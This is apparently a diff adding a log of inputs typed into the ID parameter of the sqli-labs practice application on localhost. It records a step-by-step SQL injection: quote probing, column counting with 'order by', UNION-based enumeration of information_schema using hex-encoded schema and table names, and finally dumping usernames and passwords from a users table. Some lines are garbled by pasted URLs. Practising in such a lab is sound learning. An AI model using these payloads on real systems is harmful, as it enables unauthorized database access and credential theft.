@@ -1,0 +1,89 @@
+ID:1
+ID:1
+ID:1'union select database();
+ID:1'union select database()
+ID:1'
+ID:1
+ID:'
+ID:1'
+ID:1'order by 1
+ID:1'order by 1
+ID:1'order by 1-- 
+ID:1'order by 2-- 
+ID:1'order by 5-- 
+ID:1'order by 4-- 
+ID:1'order by 4-- 
+ID:1'order by 3-- 
+ID:1' union select 1,2,3
+ID:1' select database();-- 
+ID:' select database();-- 
+ID:select database();-- 
+ID:1'union select 1,2,3,4 from Dhakkan-- 
+ID:1'union select 1,2,3,4 from (select database())-- 
+ID:1'select table_name from information_schema.tables where table_schema='csdb' and table_type='base table';
+ID:1' select table_name from information_schema.tables where table_schema='csdb' and table_type='base table'-- 
+ID:1'union select 1,2,3 from csdb
+ID:1'union select 1,2,3 from csdb-- 
+ID:'select table_name from information_schema.tables where table_schema='csdb' and table_type='base table-- 
+ID:1'union select 1,2,3-- 
+ID:'union select 1,2,3
+ID:'union select 1,2,3-- 
+ID:1
+ID:'union select 1,2,3
+ID:'union select 1,2,3-- 
+ID:'union select 1,database(),3-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479-- 
+ID:'union select 1,column_name,3 from information_schema.column where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73limit 1,0-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73limit 0,1'-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73limit 0,1#-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,1-- 
+ID:'union select 1,colhttp://127.0.0.1/sqli-labs-master/images/Less-1.jpgumn_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,2-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1.,2-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,2-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 3,2-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 3,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 2,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit 1,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit 0,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit!,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit 1,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit 3,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479 limit 4,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=http://127.0.0.1/sqli-labs-master/Less-1/index.php?id='union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 --  limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=http://127.0.0.1/sqli-labs-master/Less-1/index.php?id='union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73  limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=http://127.0.0.1/sqli-labs-master/Less-1/index.php?id='union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=http://127.0.0.1/sqli-labs-master/Less-1/index.php?id='union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,0-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 1,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 1,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 1,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 2,1-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 3,1-- 
+ID:'select 1,password,username from security.user limit 1,0-- 
+ID:'union select 1,password,username from security.user limit 1,0-- 
+ID:'union select 1,password,username from security.users limit 1,0-- 
+ID:'union select 1,password,username from security.users limit 0,1-- 
+ID:'union select 1,password,username from security.users limit 1,1-- 
+ID:'union select 1,password,username from security.users limit 2,1-- 
+ID:'union select 1,password,username from security.users limit 3,1-- 
+ID:'union select 1,password,username from security.users limit 4,1-- 
+ID:'union select 1,password,username from security.users limit 5,1-- 
+ID:'union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479-- 
+ID:'union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:')union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:9999')union select 1,column_name,3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 -- 
+ID:9999')union select 1,2,3
+ID:9999')union select 1,2,3-- 
+ID:1' select table_name from information_schema.tables where table_schema='csdb' and table_type='base table'-- 
